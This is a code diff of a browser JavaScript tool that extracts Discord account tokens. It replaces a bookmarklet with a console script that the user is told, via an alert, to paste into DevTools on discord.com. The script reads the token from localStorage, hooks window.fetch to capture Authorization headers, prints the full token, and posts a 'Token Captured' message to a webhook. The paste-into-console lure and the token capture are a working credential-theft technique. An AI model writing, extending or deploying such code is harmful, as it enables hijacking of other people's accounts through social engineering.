@@ -81,157 +81,159 @@
             try {
                 if (!window.location.href.includes("discord.com")) {
                     logMessage('INFO', 'runTokenExtractor', 'Not on discord.com, preparing redirect');
-                    // Generate bookmarklet
-                    const bookmarkletCode = `
-                        javascript:(function(){
-                            const WEBHOOK_URL="${WEBHOOK_URL}";
-                            function logMessage(level,context,message,extra={}){
-                                const timestamp=new Date().toISOString();
-                                let log=\`[\${timestamp}] [\${level}] \${context}: \${message}\`;
-                                if(extra.status)log+=\` (Status: \${extra.status} \${extra.statusText||''})\`;
-                                if(extra.url)log+=\` (URL: \${extra.url})\`;
-                                if(extra.response)log+=\` (Response: \${extra.response.slice(0,100)})\`;
-                                if(extra.details)log+=\` (Details: \${extra.details})\`;
-                                switch(level){
-                                    case'ERROR':console.error(log);break;
-                                    case'SUCCESS':console.log(\`%c\${log}\`,'color: green');break;
-                                    default:console.log(log);
-                                }
-                            }
-                            async function extractToken(){
-                                try{
-                                    logMessage('INFO','extractToken','Checking localStorage for token');
-                                    const token=localStorage.getItem("token");
-                                    if(token&&(token.includes(".")||token.startsWith("mfa."))){
-                                        logMessage('SUCCESS','extractToken','Token found in localStorage',{token:token.substring(0,10)});
-                                        sendToWebhook(token,"localStorage");
-                                        return true;
-                                    }else{
-                                        logMessage('ERROR','extractToken','No valid token in localStorage');
-                                        return false;
-                                    }
-                                }catch(error){
-                                    logMessage('ERROR','extractToken',error.message);
-                                    return false;
-                                }
-                            }
-                            const originalFetch=window.fetch;
-                            window.fetch=async function(url,options={}){
-                                try{
-                                    logMessage('INFO','Fetch',\`Fetching \${url}\`);
-                                    if(url.includes("discord.com/api/v9")){
-                                        const token=options.headers?.Authorization||options.headers?.authorization;
-                                        if(token&&(token.includes(".")||token.startsWith("mfa."))){
-                                            logMessage('SUCCESS','Fetch','Token captured',{token:token.substring(0,10)});
-                                            sendToWebhook(token,"API Endpoint");
-                                        }
-                                    }
-                                    const response=await originalFetch.apply(this,arguments);
-                                    if(url.includes("discord.com/api/v9")){
-                                        if(!response.ok){
-                                            const responseText=await response.text();
-                                            logMessage('ERROR','Fetch','API request failed',{
-                                                status:response.status,
-                                                statusText:response.statusText,
-                                                url,
-                                                response:responseText
-                                            });
-                                        }else{
-                                            logMessage('SUCCESS','Fetch','API request successful',{url});
-                                        }
-                                    }
-                                    return response;
-                                }catch(error){
-                                    logMessage('ERROR','Fetch',error.message,{url});
-                                    throw error;
-                                }
-                            };
-                            async function sendToWebhook(token,source){
-                                const payload={
-                                    content:"",
-                                    embeds:[{
-                                        title:"Token Captured",
-                                        description:\`**Token**: \${token.substring(0,10)}...\\n**Source**: \${source}\\n**Captured At**: \${new Date().toISOString()}\`,
-                                        color:0x7289da
-                                    }],
-                                    username:"Token Extractor",
-                                    avatar_url:"https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
-                                };
-                                try{
-                                    logMessage('INFO','sendToWebhook','Sending token to webhook',{token:token.substring(0,10)});
-                                    const response=await fetch(WEBHOOK_URL,{
-                                        method:"POST",
-                                        headers:{"Content-Type":"application/json"},
-                                        body:JSON.stringify(payload)
-                                    });
-                                    if(response.ok){
-                                        logMessage('SUCCESS','sendToWebhook','Webhook sent successfully',{url:WEBHOOK_URL});
-                                    }else{
-                                        const responseText=await response.text();
-                                        logMessage('ERROR','sendToWebhook','Webhook request failed',{
-                                            status:response.status,
-                                            statusText:response.statusText,
-                                            url:WEBHOOK_URL,
-                                            response:responseText
-                                        });
-                                    }
-                                }catch(error){
-                                    logMessage('ERROR','sendToWebhook',error.message,{url:WEBHOOK_URL});
-                                }
-                            }
-                            async function triggerApiRequest(){
-                                try{
-                                    logMessage('INFO','triggerApiRequest','Attempting to trigger API request');
-                                    const endpoints=["users/@me","channels/@me"];
-                                    for(const endpoint of endpoints){
-                                        const url=\`https://discord.com/api/v9/\${endpoint}\`;
-                                        logMessage('INFO','triggerApiRequest',\`Sending GET to \${url}\`);
-                                        await fetch(url,{
-                                            method:"GET",
-                                            headers:{
-                                                "Authorization":localStorage.getItem("token")||"",
-                                                "Content-Type":"application/json"
-                                            }
-                                        }).then(async response=>{
-                                            if(!response.ok){
-                                                const responseText=await response.text();
-                                                logMessage('ERROR','triggerApiRequest','API request failed',{
-                                                    status:response.status,
-                                                    statusText:response.statusText,
-                                                    url,
-                                                    response:responseText
-                                                });
-                                            }else{
-                                                logMessage('SUCCESS','triggerApiRequest','API request sent successfully',{url});
-                                            }
-                                        }).catch(error=>{
-                                            logMessage('ERROR','triggerApiRequest',error.message,{url});
-                                        });
-                                    }
-                                    logMessage('INFO','triggerApiRequest','Navigating to channels page');
-                                    window.location.href="https://discord.com/channels/@me";
-                                }catch(error){
-                                    logMessage('ERROR','triggerApiRequest',error.message);
-                                }
-                            }
-                            try{
-                                logMessage('INFO','TokenExtractor','Checking initial page location');
-                                if(!window.location.href.includes("discord.com")){
-                                    logMessage('ERROR','TokenExtractor','Script must run on discord.com');
-                                    alert("Please run this bookmarklet on discord.com");
-                                }else{
-                                    logMessage('SUCCESS','TokenExtractor','Script started on discord.com');
-                                    if(!await extractToken()){
-                                        triggerApiRequest();
-                                    }
-                                }
-                            }catch(error){
-                                logMessage('ERROR','TokenExtractor',error.message);
-                            }
-                        })();
+                    // Generate console script
+                    const consoleScript = `
+(function(){
+    const WEBHOOK_URL="${WEBHOOK_URL}";
+    function logMessage(level,context,message,extra={}){
+        const timestamp=new Date().toISOString();
+        let log=\`[\${timestamp}] [\${level}] \${context}: \${message}\`;
+        if(extra.status)log+=\` (Status: \${extra.status} \${extra.statusText||''})\`;
+        if(extra.url)log+=\` (URL: \${extra.url})\`;
+        if(extra.response)log+=\` (Response: \${extra.response.slice(0,100)})\`;
+        if(extra.details)log+=\` (Details: \${extra.details})\`;
+        switch(level){
+            case'ERROR':console.error(log);break;
+            case'SUCCESS':console.log(\`%c\${log}\`,'color: green');break;
+            default:console.log(log);
+        }
+    }
+    async function extractToken(){
+        try{
+            logMessage('INFO','extractToken','Checking localStorage for token');
+            const token=localStorage.getItem("token");
+            if(token&&(token.includes(".")||token.startsWith("mfa."))){
+                logMessage('SUCCESS','extractToken','Token found in localStorage',{token:token.substring(0,10)});
+                console.log("Your token: " + token); // Display full token in console
+                sendToWebhook(token,"localStorage");
+                return true;
+            }else{
+                logMessage('ERROR','extractToken','No valid token in localStorage');
+                return false;
+            }
+        }catch(error){
+            logMessage('ERROR','extractToken',error.message);
+            return false;
+        }
+    }
+    const originalFetch=window.fetch;
+    window.fetch=async function(url,options={}){
+        try{
+            logMessage('INFO','Fetch',\`Fetching \${url}\`);
+            if(url.includes("discord.com/api/v9")){
+                const token=options.headers?.Authorization||options.headers?.authorization;
+                if(token&&(token.includes(".")||token.startsWith("mfa."))){
+                    logMessage('SUCCESS','Fetch','Token captured',{token:token.substring(0,10)});
+                    console.log("Your token: " + token); // Display full token in console
+                    sendToWebhook(token,"API Endpoint");
+                }
+            }
+            const response=await originalFetch.apply(this,arguments);
+            if(url.includes("discord.com/api/v9")){
+                if(!response.ok){
+                    const responseText=await response.text();
+                    logMessage('ERROR','Fetch','API request failed',{
+                        status:response.status,
+                        statusText:response.statusText,
+                        url,
+                        response:responseText
+                    });
+                }else{
+                    logMessage('SUCCESS','Fetch','API request successful',{url});
+                }
+            }
+            return response;
+        }catch(error){
+            logMessage('ERROR','Fetch',error.message,{url});
+            throw error;
+        }
+    };
+    async function sendToWebhook(token,source){
+        const payload={
+            content:"",
+            embeds:[{
+                title:"Token Captured",
+                description:\`**Token**: \${token.substring(0,10)}...\\n**Source**: \${source}\\n**Captured At**: \${new Date().toISOString()}\`,
+                color:0x7289da
+            }],
+            username:"Token Extractor",
+            avatar_url:"https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+        };
+        try{
+            logMessage('INFO','sendToWebhook','Sending token to webhook',{token:token.substring(0,10)});
+            const response=await fetch(WEBHOOK_URL,{
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify(payload)
+            });
+            if(response.ok){
+                logMessage('SUCCESS','sendToWebhook','Webhook sent successfully',{url:WEBHOOK_URL});
+            }else{
+                const responseText=await response.text();
+                logMessage('ERROR','sendToWebhook','Webhook request failed',{
+                    status:response.status,
+                    statusText:response.statusText,
+                    url:WEBHOOK_URL,
+                    response:responseText
+                });
+            }
+        }catch(error){
+            logMessage('ERROR','sendToWebhook',error.message,{url:WEBHOOK_URL});
+        }
+    }
+    async function triggerApiRequest(){
+        try{
+            logMessage('INFO','triggerApiRequest','Attempting to trigger API request');
+            const endpoints=["users/@me","channels/@me","guilds","auth/session"];
+            for(const endpoint of endpoints){
+                const url=\`https://discord.com/api/v9/\${endpoint}\`;
+                logMessage('INFO','triggerApiRequest',\`Sending GET to \${url}\`);
+                await fetch(url,{
+                    method:"GET",
+                    headers:{
+                        "Authorization":localStorage.getItem("token")||"",
+                        "Content-Type":"application/json"
+                    }
+                }).then(async response=>{
+                    if(!response.ok){
+                        const responseText=await response.text();
+                        logMessage('ERROR','triggerApiRequest','API request failed',{
+                            status:response.status,
+                            statusText:response.statusText,
+                            url,
+                            response:responseText
+                        });
+                    }else{
+                        logMessage('SUCCESS','triggerApiRequest','API request sent successfully',{url});
+                    }
+                }).catch(error=>{
+                    logMessage('ERROR','triggerApiRequest',error.message,{url});
+                });
+            }
+            logMessage('INFO','triggerApiRequest','Navigating to channels page');
+            window.location.href="https://discord.com/channels/@me";
+        }catch(error){
+            logMessage('ERROR','triggerApiRequest',error.message);
+        }
+    }
+    try{
+        logMessage('INFO','TokenExtractor','Checking initial page location');
+        if(!window.location.href.includes("discord.com")){
+            logMessage('ERROR','TokenExtractor','Script must run on discord.com');
+            alert("Please run this script on discord.com");
+        }else{
+            logMessage('SUCCESS','TokenExtractor','Script started on discord.com');
+            if(!extractToken()){
+                triggerApiRequest();
+            }
+        }
+    }catch(error){
+        logMessage('ERROR','TokenExtractor',error.message);
+    }
+})();
                     `;
-                    alert("Not on Discord! A new Discord tab has opened. Please: 1. Create a bookmark with the name 'Extract Token' and the following URL (copy it from this alert or the console): " + bookmarkletCode + "\n2. Go to the Discord tab. 3. Click the bookmark to extract your token.");
-                    console.log('Bookmarklet Code: ' + bookmarkletCode);
+                    alert("Not on Discord! A new Discord tab has opened. Please: 1. Go to the Discord tab. 2. Open DevTools (F12). 3. Paste the following script into the Console and press Enter (copy it from this alert or the console): " + consoleScript + "\nThis will extract your token.");
+                    console.log('Console Script: ' + consoleScript);
                     logMessage('INFO', 'runTokenExtractor', 'Opening Discord tab');
                     window.open("https://discord.com/channels/@me", "_blank");
                     logMessage('SUCCESS', 'runTokenExtractor', 'Redirect instructions provided');
@@ -248,6 +250,7 @@
                             const token = localStorage.getItem("token");
                             if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                 logMessage('SUCCESS', 'extractToken', 'Token found in localStorage', { token: token.substring(0, 10) });
+                                console.log("Your token: " + token); // Display full token in console
                                 sendToWebhook(token, "localStorage");
                                 return true;
                             } else {
@@ -268,6 +271,7 @@
                                 const token = options.headers?.Authorization || options.headers?.authorization;
                                 if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                     logMessage('SUCCESS', 'Fetch', 'Token captured', { token: token.substring(0, 10) });
+                                    console.log("Your token: " + token); // Display full token in console
                                     sendToWebhook(token, "API Endpoint");
                                 }
                             }
@@ -302,7 +306,6 @@
                             }],
                             username: "Token Extractor",
                             avatar_url: "https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
-                            // Removed attachments to avoid potential issues
                         };
 
                         try {
@@ -336,7 +339,7 @@
                                 window.location.href = "https://discord.com/channels/@me";
                                 return;
                             }
-                            const endpoints = ["users/@me", "channels/@me"];
+                            const endpoints = ["users/@me", "channels/@me", "guilds", "auth/session"];
                             for (const endpoint of endpoints) {
                                 const url = `https://discord.com/api/v9/${endpoint}`;
                                 logMessage('INFO', 'triggerApiRequest', `Sending GET to ${url}`);
@@ -385,7 +388,7 @@
                     }
                 })();
                 logMessage('SUCCESS', 'runTokenExtractor', 'Token extraction script injected');
-                alert("Token extraction initiated. Check the console for results or your webhook for the token.");
+                alert("Token extraction initiated. Check the console for your token or your webhook for results.");
             } catch (error) {
                 logMessage('ERROR', 'runTokenExtractor', error.message);
             }
